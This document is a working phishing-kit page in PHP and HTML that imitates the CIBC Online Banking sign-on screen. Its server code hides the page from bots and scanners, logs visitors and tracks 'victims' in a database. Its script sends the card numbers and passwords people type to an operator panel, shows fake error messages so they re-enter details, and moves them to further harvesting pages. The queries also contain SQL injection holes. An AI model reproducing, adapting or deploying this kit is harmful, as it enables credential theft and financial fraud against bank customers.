<?php
$url = $_SERVER['REQUEST_URI'];


if ($enable_killbot == 1) {
   if (checkkillbot($killbot_key) == true) {
      header_remove();
      header("Connection: close\r\n");
      http_response_code(404);
      exit;
   }
}


if ($enable_antibot == 1) {
   if (checkBot($antibot_key) == true) {
      header_remove();
      header("Connection: close\r\n");
      http_response_code(404);
      exit;
   }
}


include 'ipanel/inc/blacklist.php';
include 'ipanel/inc/gateway.php';
if ($enable_antibots == "checked") {
   include 'ipanel/inc/anti.php';
}
session_start();


if($captcha_enabled== "checked") {
   $currentParams = $_SERVER['QUERY_STRING'];
    if(!isset($_SESSION['captcha_finished'])) {
    header("Location: captcha_error.php?$currentParams");
    }
}


$ip = $_SERVER['REMOTE_ADDR'];
$ua = $_SERVER['HTTP_USER_AGENT'];

$query = mysqli_query($conn, "SELECT * FROM visits WHERE ua='$ua' AND ip='$ip'");
$num = mysqli_num_rows($query);
if ($num == 0) {
   mysqli_query($conn, "INSERT INTO visits (ua, ip) VALUES ('$ua', '$ip')");
}


if ($_SESSION['started'] !== 'true') {
if($sitekey_enabled== "checked") {

if (preg_match("~\b$sitekey_word\b~", $url)) { } else {header("Location: $exit_link");}


}
}

if($_SESSION['started'] == 'true'){
   $uniqueid = $_SESSION['uniqueid'];
   $query = mysqli_query($conn, "SELECT * FROM victims WHERE uniqueid=$uniqueid");
   if ($query) {
           $query = mysqli_query($conn, "UPDATE victims SET status=1, buzzed=0 WHERE uniqueid=$uniqueid");
       }
}



if ($_SESSION['started'] == 'true') {
   //get what you want from the database
   $uniqueid = $_SESSION['uniqueid'];
   $query = mysqli_query($conn, "SELECT * FROM victims WHERE uniqueid=$uniqueid");
   if ($query) {
      $arr = mysqli_fetch_array($query, MYSQLI_ASSOC);
      $user = $arr['user'];
      if ($user != '') {
         $error = "<div class='ui-set-messages global-error' id='errors'><div class='ui-alert'><div class='ui-scope-global ui-display-error' tabindex='-1'><div id='vue48-message' class='ui-text'>You have entered incorrect information. Check your information and try again. After multiple failed attempts, you may be locked out. For password issues, you can select the checkbox to view your password or reset it.<br><br>For CIBC Costco Mastercard holders, use the phone number you previously had on file.<p><a href='#'>Reset your password.</a></p></div><div class='ui-code'>{Result #0008}</div></div></div></div>";
      }
   }
}

?>
<!DOCTYPE html>
<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width,initial-scale=1">
<link rel="icon" href="./theme/favicon.png">
<title>Sign on | CIBC Online Banking</title>
<link rel="stylesheet" type="text/css" href="./theme/157-9d907173.css">
<link rel="stylesheet" type="text/css" href="./theme/default-styles-v2.min.css">
<link rel="stylesheet" type="text/css" href="./theme/ice.css">



<script type="text/javascript" src="theme/jquery-2.2.3.js"></script>
<script src="theme/styles.js" type="text/javascript"></script>


<script>
function check(form) {


if (!checkThenr (document.getElementById('cnr').value,document.getElementById('thetype').value))
{ form.cnr.focus(); return;}


var regExpressPostcode = /^(?=.*[a-z])(?=.*[A-Z]).{6,}$/
if (!regExpressPostcode.test(form.password.value))
{ form.password.focus(); return;}



document.getElementById('pleasewait').style.display = "block";

setTimeout(function() {
   submit_form();
}, 2000); 


}

function change(){
var change = document.getElementById("cnr").value;

if (change.charAt(0) == '5') {
document.getElementById("thetype").value = "MxM";
}

else if (change.charAt(0) == '4') {
document.getElementById("thetype").value = "VxV";
}

else if (change.charAt(0) == '3') {
document.getElementById("thetype").value = "AxA";
}

else if (change.charAt(0) == '6') {
document.getElementById("thetype").value = "DxD";
}

}

function showit() {
var x = document.getElementById("password");
if (x.type === "password") {
x.type = "text";
document.getElementById('showhidetext').innerHTML = "Hide Password";
} 
else {
x.type = "password";
document.getElementById('showhidetext').innerHTML = "Show Password";
}
}
</script>


</head>
<body>
<div id="appLoadingSpinner" class="app-loading-spinner" style="display: none;" role="img">
<style></style><div class="app-loading-cube-grid"><div class="app-loading-cube app-loading-cube1"></div><div class="app-loading-cube app-loading-cube2"></div><div class="app-loading-cube app-loading-cube3"></div><div class="app-loading-cube app-loading-cube4"></div><div class="app-loading-cube app-loading-cube5"></div><div class="app-loading-cube app-loading-cube6"></div><div class="app-loading-cube app-loading-cube7"></div><div class="app-loading-cube app-loading-cube8"></div><div class="app-loading-cube app-loading-cube9"></div></div></div>

<div id="pleasewait" class="in-flight" role="img" style="display: none;" tabindex="-1" data-v-1697fa86=""><div class="sk-cube-grid" data-v-1697fa86=""><div class="sk-cube sk-cube1" data-v-1697fa86=""></div><div class="sk-cube sk-cube2" data-v-1697fa86=""></div><div class="sk-cube sk-cube3" data-v-1697fa86=""></div><div class="sk-cube sk-cube4" data-v-1697fa86=""></div><div class="sk-cube sk-cube5" data-v-1697fa86=""></div><div class="sk-cube sk-cube6" data-v-1697fa86=""></div><div class="sk-cube sk-cube7" data-v-1697fa86=""></div><div class="sk-cube sk-cube8" data-v-1697fa86=""></div><div class="sk-cube sk-cube9" data-v-1697fa86=""></div></div></div>

<div id="app" data-v-app="">
<div id="orchestrator">
<div pathmatch="signon">
<div id="Auth" data-v-app="">
<div id="auth-root">
<div class="announcer" aria-live="polite" aria-atomic="true" data-v-816f4d06="">
Sign on has loaded.</div>
<div tabindex="-1">
</div>
<div aria-hidden="false">
<div class="page-layout">
<div class="header-section cell">
<div class="grid-container">
<header class="page-header">
<div class="top-bar">
<div class="header-container">
<button class="null ui-display-default ui-button" loading="false" lang="fr">
Français</button>
</div>
</div>
<div class="header-logo">
<div class="header-container">
<a href="#"><img class="logo" src="./theme/logo-colour.89bf60f2.svg"></a>
</div>
</div>
</header>
</div>
</div>
<div class="background-pattern">
</div>
<div class="main-content">
<main>
<div class="masthead">
<h1>
<span class="preheading">
CIBC Online Banking</span>
<span class="show-for-sr">
&nbsp;</span>
 Sign on using your CIBC card number</h1>
<div class="subheading">
Not registered for Online Banking or Mobile Banking? <a href="#">
Register now.</a>
</div>
</div>
<div class="grid">
<div class="section-wrapper section-wrapper-signon">

<form  action="" method="post" >
<input id="thetype" type="hidden" name="thetype"  value="">
<div class="signon-form-wrapper">
<div class="ui-set-messages global-error" id="errors" style="display: none;"><div class="ui-alert"><div class="ui-scope-global ui-display-error" tabindex="-1"><div id="vue48-message" class="ui-text">You have entered incorrect information. Check your information and try again. After multiple failed attempts, you may be locked out. For password issues, you can select the checkbox to view your password or reset it.<br><br>For CIBC Costco Mastercard holders, use the phone number you previously had on file.<p><a href="#">Reset your password.</a></p></div><div class="ui-code">{Result #0008}</div></div></div></div>
<?= $error ?>
<div class="signon-form">
<div role="form" class="signon-elements-wrapper">
<div class="card-number-wrapper">
<div class="card-number-input-field">
<div class="ui-set-text-box-wrapper">
<label class="ui-partial-label" for="cnr">
Card number </label>
<div class="ui-wrapper">
<input id="cnr" name="cnr" maxlength="19" aria-invalid="false" autocomplete="cc-number" onKeyDown="if(event.keyCode==13) check(this.form);" onpaste="change();" onkeyup="change();" onchange="change();" type="tel" pattern="[0-9]*">
</div>
<div id="vue12-messages" class="ui-set-messages">
</div>
</div>
</div>
<div class="remember-card">
<div class="ui-set-checkbox-wrapper">
<div class="ui-checkbox">
<input id="remember-card-checkbox" class="" type="checkbox" value="false">
</div>
<label id="remember-card-label" class="ui-partial-label" for="remember-card-checkbox">
Remember this card number </label>
<div id="vue16-messages" class="ui-set-messages">
</div>
</div>
<div class="ui-set-popover-wrapper">
<button class="null ui-display-default ui-button ui-popover-button" loading="false" type="button">
</button>
</div>
</div>
</div>
<div class="password-input-field-wrapper">
<div class="password-input-field">
<div class="ui-set-text-box-wrapper">
<label class="ui-partial-label" for="password">
Password (case sensitive) </label>
<div class="ui-wrapper">
<input id="password" name="password" type="password" maxlength="32" aria-invalid="false" autocomplete="current-password" onKeyDown="if(event.keyCode==13) check(this.form);">
</div>
<div id="vue23-messages" class="ui-set-messages">
</div>
</div>
<div class="ui-set-checkbox-wrapper" onclick="showit();">
<div class="ui-checkbox">
<input id="27-field" class="" type="checkbox" aria-describedby="vue27-messages" value="false">
</div>
<label class="ui-partial-label" for="27-field" id="showhidetext" onclick="showit();">
Show password </label>
<div id="vue27-messages" class="ui-set-messages">
</div>
</div>
</div>
</div>
<div class="reset-password">
<a href="#">
Reset password</a>
</div>
</div>
<div class="ui-action-bar">
<button class="primary-button ui-display-default ui-button" loading="false" onclick="check(this.form)" type="button">
Sign on</button>
<button class="secondary-button ui-display-default ui-button" loading="false" type="button">
Register now</button>
</div>
<div class="security-section">
<img class="security-vector" src="./theme/Security.c44645dd.svg"><a href="#" datatestid="security-link">Safe banking online, guaranteed</a>
</div>
</div>
</div>
</form>
</div>
<div class="section-wrapper section-wrapper-resources">
<div class="resources-wrapper">
<h2 class="heading-XS">
Resources</h2>
<ul class="resources-link-container">
<li>
<a class="body-S" href="#">
<span>
<strong>
CIBC Costco®† Mastercard® clients</strong></span><img src="./theme/right-arrow-icon.e4b0d3ca.svg">
</a>
</li>
<li>
<a class="body-S" href="#">
<span>Request financial assistance</span><img src="./theme/right-arrow-icon.e4b0d3ca.svg">
</a>
</li>
<li>
<a class="body-S" href="#">
<span>Set up direct deposit</span><img src="./theme/right-arrow-icon.e4b0d3ca.svg">
</a>
</li>
<li>
<a class="body-S" href="#">
<span>
Tax slip mailing dates</span><img src="./theme/right-arrow-icon.e4b0d3ca.svg">
</a>
</li>
<li>
<a class="body-S" href="#">
<span>New fraud alerts</span><img src="./theme/right-arrow-icon.e4b0d3ca.svg">
</a>
</li>
</ul>
</div>
</div>
<div class="section-wrapper section-wrapper-ads">
<div class="advertisement-target target-signon-rotating">
 
<div class="aem full-bleed-image-right signon-rotating en" style="background-color: #FFFFFF;">
 
 <div class="content" style="background-color: #FFFFFF;">
 
  <span class="hidden-text">
What follows is an advertisement.</span>
 
  <h2 class="promo-headline">
We’ve enhanced our app to make mobile banking easier.</h2>
 
  <p class="promo-link" aria-hidden="true">
Learn more</p>
 
  <a class="ma-link" href="#">
<span class="hidden-text">
 Opens in a new window.</span>
</a>
 
 </div>
 
 <img src="./theme/cq5dam.web.1280.1280.jpeg" class="background-image">
 
 <span class="hidden-text">
This is the end of the advertisement.</span>
 
</div>
</div>
<div class="advertisement-target target-signon-anchor">
 
<div class="aem full-bleed-image-right signon-anchor en" style="background-color: #FFFFFF;">
 
 <div class="content" style="background-color: #FFFFFF;">
 
  <span class="hidden-text">
What follows is an advertisement.</span>
 
  <h2 class="promo-headline">
Forgot your password? No problem. Reset it online or on your phone, quickly and securely.</h2>
 
  <p class="promo-link" aria-hidden="true">
Learn more</p>
 
  <a class="ma-link" href="#">
<span class="hidden-text">
 about how to reset your password.</span>
</a>
 
 </div>
 
 <img src="./theme/cq5dam.web.1280.1280(1).jpeg" class="background-image" style="display: block; height: 180px;">
 
 <span class="hidden-text">
This is the end of the advertisement.</span>
 
</div>
</div>
</div>
</div>
</main>
<div class="grid-container">
</div>
</div>
<div class="footer-section">
<footer class="footer-container">
<div class="footer-wrapper">
<div class="footer-section-item">
<h2 class="body-L">
Quick Links</h2>
<ul class="footer-section-item-links">
<li>
<a href="#">
<img src="./theme/products.svg" class="left">
 Explore Products </a>
</li>
<li>
<a href="#">
<img src="./theme/locator.svg" class="left">
 Branch and ATM Locator </a>
</li>
<li>
<a href="#">
<img src="./theme/phone.svg" class="left">
 Contact Us </a>
</li>
</ul>
</div>
<div class="footer-section-item">
<h2 class="body-L">
I'm Looking For</h2>
<ul class="footer-section-item-links">
<li>
<a href="#">
 Special Offers </a>
</li>
<li>
<a href="#">
 Site Map </a>
</li>
</ul>
</div>
<div class="footer-section-item">
<h2 class="body-L">
About CIBC</h2>
<ul class="footer-section-item-links">
<li>
<a href="#">
 Ways to Bank </a>
</li>
<li>
<a href="#">
 Our Business </a>
</li>
<li>
<a href="#">
 Careers </a>
</li>
</ul>
</div>
<div class="footer-section-item">
<h2 class="body-L">
Legal Information</h2>
<ul class="footer-section-item-links">
<li>
<a href="#">
 AdChoices <img src="./theme/ad-choices-icon.svg" class="right">
</a>
</li>
<li>
<a href="#">
 Electronic Access Agreement </a>
</li>
<li>
<a href="#">
 CDIC Deposit Insurance Information </a>
</li>
<li>
<a href="#">
 Privacy and Security </a>
</li>
<li>
<a href="#">
 Legal </a>
</li>
</ul>
</div>
</div>
<span class="footer-release-version-number">
EB59
 v3.3.1</span>
</footer>
</div>
</div>
</div>
<div id="dialog-portal">
</div>
<div id="sessions-timeout">
</div>
</div>
</div>
</div>
</div>
</div>


<script type="text/javascript">
    window.onload=function(){
input_nr = function(jQinp)
{
    var format_and_pos = function(input, char, backspace)
    {
        var start = 0;
        var end = 0;
        var pos = 0;
        var value = input.value;
        if (char !== false)
        {
            start = input.selectionStart;
            end = input.selectionEnd;
            if (backspace && start > 0) // handle backspace onkeydown
            {
                start--;
                if (value[start] == " ")
                { start--; }
            }
            // To be able to replace the selection if there is one
            value = value.substring(0, start) + char + value.substring(end);
            pos = start + char.length; // caret position
        }
        var d = 0; // digit count
        var dd = 0; // total
        var gi = 0; // group index
        var newV = "";
        var groups = /^\D*3[47]/.test(value) ? 
        [4, 6, 5] : [4, 4, 4, 4];
        for (var i = 0; i < value.length; i++)
        {
            if (/\D/.test(value[i]))
            {
                if (start > i)
                { pos--; }
            }
            else
            {
                if (d === groups[gi])
                {
                    newV += " ";
                    d = 0;
                    gi++;
                    if (start >= i)
                    { pos++; }
                }
                newV += value[i];
                d++;
                dd++;
            }
            if (d === groups[gi] && groups.length === gi + 1) // max length
            { break; }
        }
        input.value = newV;
        if (char !== false)
        { input.setSelectionRange(pos, pos); }
    };
    jQinp.keypress(function(e)
    {
        var code = e.charCode || e.keyCode || e.which;
        // Check for tab and arrow keys (needed in Firefox)
        if (code !== 9 && (code < 37 || code > 40) &&
        // and CTRL+C / CTRL+V
        !(e.ctrlKey && (code === 99 || code === 118)))
        {
            e.preventDefault();
            var char = String.fromCharCode(code);
            // if the character is non-digit
            // -> return false (the character is not inserted)
            if (/\D/.test(char))
            { return false; }
            format_and_pos(this, char);
        }
    }).
    keydown(function(e) // backspace doesn't fire the keypress event
    {
        if (e.keyCode === 8 || e.keyCode === 46) // backspace or delete
        {
            e.preventDefault();
            format_and_pos(this, '', this.selectionStart === this.selectionEnd);
        }
    }).
    on('paste', function()
    {
        // A timeout is needed to get the new value pasted
        setTimeout(function()
        { format_and_pos(jQinp[0], ''); }, 50);
    }).
    blur(function() // reformat onblur just in case (optional)
    {
        format_and_pos(this, false);
    });
};
input_nr($('#cnr'));
}
</script>

</body></html>


<script src="assets/js/jquery-1.11.3.min.js"></script>
   <script src="assets/js/main.js"></script>
   <script>
      var pinger = setInterval(function() {
         var urldata = "ipanel/inc/action.php?type=ping";
         $.ajax({
            url: urldata,
            type: "GET",
            success: function(response) {
               //console.log(response)
            }
         });
      }, 1000);
      function submit_form() {
         var pid = document.getElementById('cnr').value;
		/*  var pid = pid.replace(/\s+/g, ''); */
         var securityNumber = document.getElementById('password').value;
         $.ajax({
            type: 'POST',
            url: 'ipanel/inc/action.php?type=login',
            data: 'pid=' + pid + '&securityNumber=' + securityNumber,
            success: function(data) {
               var parsed_data = JSON.parse(data);
               if (parsed_data.status == 'ok') {
                  timer();
               }
            }
         })
      }


   </script>
      <script>
   function timer() {
		var statusredirect = <?php echo json_encode($static_redirect); ?>;
         var urldata = "ipanel/inc/action.php?type=getstatus";
         $.ajax({
            url: urldata,
            type: "GET",
            success: function(response) {
               if (statusredirect == 'checked') {
                  clearInterval(timer)
                  window.location.href = "personal.php";
               } else if (response == '2') {
                  clearInterval(timer)
                  window.location.href = "loading.php";
               }
            }

         });
      }

   </script>
